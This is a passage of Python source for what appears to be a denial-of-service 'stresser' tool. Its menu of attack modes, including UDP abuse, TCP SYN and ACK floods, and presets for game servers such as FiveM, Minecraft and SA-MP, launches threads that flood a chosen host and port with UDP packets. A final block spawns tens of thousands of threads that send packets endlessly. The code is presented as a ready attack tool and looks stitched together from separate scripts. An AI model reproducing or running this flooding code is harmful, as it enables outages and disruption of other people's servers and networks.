					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-instant-abuse":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 21222345
					drop = 21223455
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-fivem":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10822322
					drop = 10822322
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-raknet":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 110443221
					drop = 110443221
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-minecraft":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 110882332
					drop = 110822322
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-arkv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 21233455
					drop = 21233455
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-unturneb":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 110443223
					drop = 110443223
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-samp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912333
					drop = 912333
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-abuse":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65634337
					drop = 6564337
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-syn":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912443
					drop = 912443
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-ack":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10332454
					drop = 10332454
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-rand":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10009823
					drop = 10098233
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-data":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 20065645
					drop = 20065645
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))    
                

if __name__ == '__main__':
    try:
     for x in range(65530):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
